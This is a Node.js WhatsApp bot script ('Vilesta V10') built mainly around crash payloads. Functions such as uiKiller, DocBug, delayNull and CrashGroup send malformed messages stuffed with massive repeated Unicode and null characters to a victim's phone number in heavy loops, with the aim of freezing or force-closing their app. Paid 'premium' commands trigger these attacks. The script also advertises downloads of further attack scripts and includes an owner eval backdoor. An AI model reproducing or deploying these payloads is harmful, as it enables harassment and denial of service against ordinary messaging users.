require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = ciciimup = async (ciciimup, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ciciimup.user.id.split(":")[0] + "@s.whatsapp.net" || ciciimup.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await ciciimup.decodeJid(ciciimup.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await ciciimup.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = fs.readFileSync('./cicitzy/cici-clyriné.jpg')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = fs.readFileSync('./cicitzy/cici-clyriné.jpg')
const ciciimupreply = async (teks) => {
  return ciciimup.sendMessage(m.chat, {
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        showAdAttribution: false, // Nonaktifkan karena sering menyebabkan kompatibilitas issues
        renderLargerThumbnail: false, // Gunakan thumbnail yang lebih besar untuk kompatibilitas
        title: `VILE͢STA V10.0`,
        body: `🌸 cici clyriné`,
        previewType: "PHOTO", // Sesuaikan dengan tipe media (gambar)
        thumbnail: RC,
        sourceUrl: `https://whatsapp.com/channel/0029Vb6nbYY9xVJpD5lB1T32`,
        mediaUrl: `https://files.catbox.moe/88b58u.jpg`
      }
    },
    text: teks
  }, {
    quoted: m
  })
}


const bugres = '*</> cicitzy in processs 🌸 </>*'

 // function bug
async function uiKiller(target) {
  await ciciimup.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ི꒦ྀ".repeat(9000), 
        url: "https://null.com" +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://ciciimup.com" +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( null )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}

async function DocBug(target) {
 let virtex = "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟";
   ciciimup.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "@null" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

async function LocaBugs(target) {
 await ciciimup.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "@null" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ciciimup.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function stikerNotif(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "@null",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await ciciimup.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function delayNull(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"AGLER\",\"tower_number\":\"AGLER\",\"city\":\"@null\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await ciciimup.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function ForceClose2(target) {
  for (let i = 0; i < 1; i++) {
  const teks = `\`𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟\``+"ꦾ".repeat(550);
  const image = 'https://files.catbox.moe/f4kqyq.jpg';
  const agler = `\`attack system ${target}\``
  await ciciimup.relayMessage(target, {
  image: { url: image },
  caption: teks
  }, { participant: { jid: target } });

   let buttons = [
   {buttonId: '120363372721190301@newsletter', buttonText:
   {displayText: '𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟'},
   type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }
   await ciciimup.relayMessage(target,
   buttonMessage, { participant: { jid: target } });

   await ciciimup.sendMessage(m.chat, {
    image: { url: image },
    caption: agler
   }, { quoted: m });

  console.log(chalk.blue('attack force close'))
    }
   }

async function CrashGroup(target) {
  for (let i = 0; i < 500; i++) {
  const teks = `\`𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟\``+"ꦾ".repeat(780);
  const image = 'https://files.catbox.moe/f4kqyq.jpg';
  await ciciimup.relayMessage(target, {
  image: { url: image },
  caption: teks
  }, { participant: { jid: target } });

   let buttons = [
   {buttonId: '.bug-gb', buttonText:
   {displayText: '𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟'},
   type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }

   await ciciimup.sendMessage(m.chat, {
    image: { url: image },
    caption: teks
   }, { quoted: m });

   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })
  console.log(chalk.blue('attack force close'))
    }
   }

  async function cicitzy1(target) {
    for (let i = 0; i < 100; i++) {
      await uiKiller(target)
      await DocBug(target)
      await LocaBugs(target)
      await ngeloc(target)
      await stikerNotif(target)
      await delayNull(target)
      await uiKiller(target)
      await sleep(1000)
      await DocBug(target)
      await sleep(1000)
      await LocaBugs(target)
      await sleep(1000)
      await ngeloc(target)
      await sleep(1000)
      await stikerNotif(target)
      await sleep(1000)
      await delayNull(target)
     }
    }

    async function cicitzy2(target) {
    for (let i = 0; i < 100; i++) {
      await uiKiller(target)
      await DocBug(target)
      await LocaBugs(target)
      await ngeloc(target)
      await stikerNotif(target)
      await delayNull(target)
      await ForceClose2(target)
      await uiKiller(target)
      await sleep(1000)
      await DocBug(target)
      await sleep(1000)
      await LocaBugs(target)
      await sleep(1000)
      await ngeloc(target)
      await sleep(1000)
      await stikerNotif(target)
      await sleep(1000)
      await delayNull(target)
      await ForceClose2(target)
     }
    }


switch (command) {
case 'menu': {
m.reply(`*🎀 cici clyriné 🎀*`) 
const teks = `
*🌸 inform͢ações 🌸*
> *➼ nome :* ↯ vile͢stá
> *➼ versão :* ↯ 10.0.0
> *➼ dev :* ↯ cici clyr͢iné
> *➼ geração :* ↯ 7 legal

*🎀 bug ↯ menu 🎀*
> ➩ .xandro ↯ *número*
> ➩ .xios ↯ *número*
> ➩ .xiphone ↯ *número*
> ➩ .ui-system ↯ *número*
> ➩ .bug-gacor ↯ *—*

*🎀 own ↯ menu 🎀*
> ➩ .addprem ↯ *número*
> ➩ .delprem ↯ *número*
> ➩ .owner ↯ *—*

*canal do desenvolvedor*
https://${global.cicitzyBug}
`
const image = 'https://files.catbox.moe/88b58u.jpg'; // ganti dengan URL image yang ingin dikirimkan
let buttons = [
     {buttonId: '.bug-gacor', buttonText: {displayText: '🌸⃟༑⌁⃰𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡🎀'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
//     gifPlayback: true,
     caption: teks,
     buttons: buttons,
     contextInfo: {
       forwardingScore: 999,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
           newsletterJid: "120363406045012846@newsletter",
             newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
            }
        },
        footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡🎀",
        viewOnce: true,
        headerType: 6
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })
 // batas code button
   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'bug-gacor': {
m.reply(`*🎀 cici clyriné 🎀*`) 
const teks = `
*🌸 inform͢ações 🌸*
> *➼ nome :* ↯ vile͢stá
> *➼ versão :* ↯ 10.0.0
> *➼ dev :* ↯ cici clyr͢iné
> *➼ geração :* ↯ 7 legal

*🎀 bug ↯ menu 🎀*
> ➩ .crash-memek ↯ *número*
> ➩ .bug-group ↯ *—*

*🎀 own ↯ menu 🎀*
> ➩ .addprem ↯ *número*
> ➩ .delprem ↯ *número*
> ➩ .owner ↯ *—*

*canal do desenvolvedor*
https://${global.cicitzyBug}
`
const image = 'https://files.catbox.moe/88b58u.jpg'; // ganti dengan URL image yang ingin dikirimkan
let buttons = [
     {buttonId: '.gacor', buttonText: {displayText: '🌸⃟༑⌁⃰𝐈𝐧𝐟𝐨 𝐁͢𝐮𝐠 𝐆𝐚͢𝐜𝐨𝐫ͮ͢ཀ͜͡🎀'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
//     gifPlayback: true,
     caption: teks,
     buttons: buttons,
     contextInfo: {
       forwardingScore: 999,
         isForwarded: true,
         forwardedNewsletterMessageInfo: {
           newsletterJid: "120363406045012846@newsletter",
             newsletterName: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
            }
        },
        footer: "🌸⃟༑⌁⃰𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚ͮ͢ཀ͜͡🎀",
        viewOnce: true,
        headerType: 6
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })

   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'bug-group': {
m.reply(`*🎀 cici clyriné 🎀*`) 
const teks = `
*⚠️ warning ⚠️*

*jangan kilick tabel button di pribadi*

*klick tabel button di bawah ini, harus klick di group WhatsApp yang terbuka*
`
const image = 'https://files.catbox.moe/88b58u.jpg'; // ganti dengan URL image yang ingin dikirimkan
let buttons = [
     {buttonId: '.bug-gb', buttonText: {displayText: '🌸⃟༑⌁⃰𝐁͢𝐮𝐠 𝐆𝐫𝐨͢𝐮𝐩ͮ͢ཀ͜͡🎀'}, type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }
   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })

   ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false, caption: teks }, {quoted: m})
 }
break

case 'ell':
case 'acot':
case 'mpas':
case 'acor':
case 'ya':
case 'a':
case 'anel':
case 'atim':
case 'emek': {
ciciimupreply(`
*🔥 VILE͢STA V9.0 🔥*
https://www.mediafire.com/file/txsqywyj9yp9j0e/🐉⃝⃝𝐕𝐢𝐥𝐞𝐬𝐭𝐚͢+𝐕𝟗.𝟎͞🦠͞.zip/file
> script bot bug terbaru update 20 nov 2025

*MD fitur 2500+ canggi 🌸*
*BUG fitur gacor 💧*
- bug system android
- bug system ios
- bug system iphone
- bug group system
- force close no click
> node 21 only bisa 20 juga bisa kayaknya 🗿
_from : cicitzy / cici clyrine_

*🌸 SUMBER SHARE 🌸*
https://whatsapp.com/channel/0029Vb6nbYY9xVJpD5lB1T32

*👇🏻SC BUG BRUTAL FORCLOSE👇🏻*
https://drive.google.com/file/d/14XaS3kb_OhlzJpDW3VktAT8POaE5QrEY/view?usp=drivesdk`)
}
break

case 'ug':
case 'ontol':
case 'ama': 
case 'c':
case 'pen': {
ciciimupreply(`
*🔥 VILE͢STA V9.0 🔥*
https://www.mediafire.com/file/txsqywyj9yp9j0e/🐉⃝⃝𝐕𝐢𝐥𝐞𝐬𝐭𝐚͢+𝐕𝟗.𝟎͞🦠͞.zip/file
> script bot bug terbaru update 20 nov 2025

*MD fitur 2500+ canggi 🌸*
*BUG fitur gacor 💧*
- bug system android
- bug system ios
- bug system iphone
- bug group system
- force close no click
> node 21 only bisa 20 juga bisa kayaknya 🗿
_from : cicitzy / cici clyrine_

*🌸 SUMBER SHARE 🌸*
https://whatsapp.com/channel/0029Vb6nbYY9xVJpD5lB1T32

*👇🏻SC BUG BRUTAL FORCLOSE👇🏻*
https://drive.google.com/file/d/14XaS3kb_OhlzJpDW3VktAT8POaE5QrEY/view?usp=drivesdk`)
}
break

case 'bug-gb': {
if (!isPremium)
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
  for (let i = 0; i < 100; i++) {
   await CrashGroup(target)
  }
}
break

case 'gacor': {
m.reply(`
pingin tau fitur bug gacor di sc ini??

transfer 5k ke nomor dana berikut ini, agar kamu dapat akses bug yang lebih gacor

nama : devy
dana : 0895329013688

silahkan saya tunggu dalam 5 menit`)
}
break

case 'xandro':
case 'xios':
case 'xiphone':
case 'ui-system': {
if (!isPremium) return ciciimupreply('</> khusus akses premium </>')
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_mohon gunakan jeda 5 menit saat memakai bug ini, agar nomor anda tidak terkena banned_
`) 
for (let i = 0; i < 50; i++) {
await cicitzy1(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'crash-memek': {
if (!isPremium) return ciciimupreply('</> khusus akses premium </>')
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_mohon gunakan jeda 5 menit saat memakai bug ini, agar nomor anda tidak terkena banned_
`) 
for (let i = 0; i < 70; i++) {
await cicitzy2(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'tesbug': {
if (!isPremium) return ciciimupreply('</> khusus akses premium </>')
await ciciimup.sendMessage(m.chat, { react: { text: `♨️`, key: m.key }})
if (!q) return ciciimupreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
ciciimupreply(bugres)
ciciimupreply(`*</> ⚠ warning ⚠️</>*

_mohon gunakan jeda 5 menit saat memakai bug ini, agar nomor anda tidak terkena banned_
`) 
for (let i = 0; i < 3; i++) {
await cicitzy2(target)
}
ciciimupreply(`Suscesfully attack to ${target}🐉`)
 // ciciimup || Mengirim Reply Sound
ciciimup.sendMessage(m.chat, {audio: fs.readFileSync('./cicitzy/cici-clyriné.mp3'), mimetype:'audio/mpeg', ptt: false}, {quoted: m})
}
break

case 'addprem': case 'add-acces': {
if (!Access) return ciciimupreply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return ciciimupreply(`mana nomornya dan mau berapa hari? contoh : ${prefix + command} @tag|30d`)
    if (!hari) return ciciimupreply(`mau yang berapa hari njrr?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return ciciimupreply('lol, owner kan bebas')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return ciciimupreply('Suscesfully add premium🐉')
    let data = await ciciimup.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium🐉')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/9drox6.jpg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029Vb6nbYY9xVJpD5lB1T32'
                }	
            }	
        };	
        return ciciimup.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         ciciimupreply("not found")
    }	
}
break

case 'owner': case 'own': {
ciciimupreply(`https://${global.owner}
NIH OWNER GW, JANGAN MACEM MACEM.!! 🌸

> cici clyriné`)
}
break

case 'delprem': case 'del-acces': {
if (!Access) return ciciimupreply(mess.owner)
    if (!args[0]) return ciciimupreply(`siapa yang mau di ${command}? gunakan nomor/tag, contoh : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return ciciimupreply("bukan user premium ini mah")
    let data = await ciciimup.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        ciciimupreply('user tersebut telah di hapus')
    } else {	
        ciciimupreply("not found")
    }
}
break

case 'public': {
if (!isPremium) return ciciimupreply(" maaf kamu tidak memiliki akses ")
ciciimup.public = true
ciciimupreply(`*berhasil mengubah bot ke mode public*`)
}
break

case 'self': {
if (!isPremium) return ciciimupreply(" maaf kamu tidak memiliki akses ")
ciciimup.public = false
ciciimupreply(`*berhasil mengubah bot ke mode self*`)
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
